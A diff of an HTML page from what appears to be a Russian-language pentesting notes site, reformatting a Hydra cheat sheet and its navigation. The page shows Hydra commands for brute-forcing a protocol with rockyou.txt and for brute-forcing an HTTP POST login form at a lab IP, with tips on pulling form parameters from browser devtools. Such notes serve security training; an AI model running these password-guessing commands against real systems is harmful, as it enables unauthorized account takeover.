@@ -1107,8 +1107,8 @@
   
   
     <li class="md-nav__item">
-      <a href="../curl/" class="md-nav__link">
-        curl
+      <a href="../Burp_Suite/" class="md-nav__link">
+        Burp suite
       </a>
     </li>
   
@@ -1121,8 +1121,8 @@
   
   
     <li class="md-nav__item">
-      <a href="../Burp_Suite/" class="md-nav__link">
-        Burp suite
+      <a href="../curl/" class="md-nav__link">
+        curl
       </a>
     </li>
   
@@ -1200,9 +1200,47 @@
         
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Hydra
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         Hydra
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Содержание раздела">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Содержание раздела
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    Брутфорс определенного протокола
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-post" class="md-nav__link">
+    Брутфорс http POST формы
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -2137,6 +2175,28 @@
     
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Содержание раздела
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    Брутфорс определенного протокола
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-post" class="md-nav__link">
+    Брутфорс http POST формы
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -2153,15 +2213,29 @@
 <h1 id="hydra">Hydra</h1>
 <hr />
 <p>Online cracking tool способная быстро перебирать credentinals для различных протоколов прикладного уровня.</p>
-<p>Примеры использования:
-<strong><code>hydra -vV -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV $TARGET_IP $PROTO"</code></strong>
-<em>брутфорс определенного протокола</em></p>
-<p><strong><code>hydra -vV -e nsr -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt 10.10.125.121 http-post-form "/js/login.js:username=^USER^&amp;password=^PASS^:Incorrect Credentials"</code></strong>
-<em>брутфорс http POST формы</em></p>
-<p>Описание параметров и откуда их взять:
-/js/login.js - скрипт который непосредственно отвечает за авторизацию. Открыть devtools, посмотреть stack trace во вкладке network
-<code>username=^USER^&amp;password=^PASS^</code> - ^USER^, ^PASS^ для подстановки значений из списков. Cтроку взять из вкладки network-&gt;request в raw формате.
-<code>Incorrect Credentials</code> - строка сообщение об ошибке.</p>
+<p>Примеры использования:</p>
+<h5 id="_1">Брутфорс определенного протокола</h5>
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>hydra<span class="w"> </span>-vV<span class="w"> </span>-t<span class="w"> </span><span class="m">16</span><span class="w"> </span>-l<span class="w"> </span>USERNAME<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>-vV<span class="w"> </span><span class="nv">$TARGET_IP</span><span class="w"> </span><span class="nv">$PROTO</span><span class="s2">&quot;</span>
+</span></code></pre></div>
+<h5 id="http-post">Брутфорс http POST формы</h5>
+<p><div class="language-Bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>hydra<span class="w"> </span>-vV<span class="w"> </span>-e<span class="w"> </span>nsr<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>-L<span class="w"> </span>/usr/share/seclists/Usernames/top-usernames-shortlist.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>-P<span class="w"> </span>/usr/share/seclists/Passwords/2020-200_most_used_passwords.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="m">10</span>.10.125.121<span class="w"> </span>http-post-form<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="s2">&quot;/js/login.js:username=^USER^&amp;password=^PASS^:Incorrect Credentials&quot;</span>
+</span></code></pre></div>
+Описание параметров и откуда их взять:</p>
+<p><code>/js/login.js</code> - скрипт который непосредственно отвечает за авторизацию. </p>
+<blockquote>
+<p>Открыть devtools, посмотреть stack trace во вкладке network.</p>
+</blockquote>
+<p><code>username=^USER^&amp;password=^PASS^</code> - <code>^USER^</code>, <code>^PASS^</code> для подстановки значений из списков.</p>
+<blockquote>
+<p>Cтроку взять из вкладки network-&gt;request в raw формате.</p>
+</blockquote>
+<p><code>Incorrect Credentials</code> - строка сообщения об ошибке.</p>
 
 
 
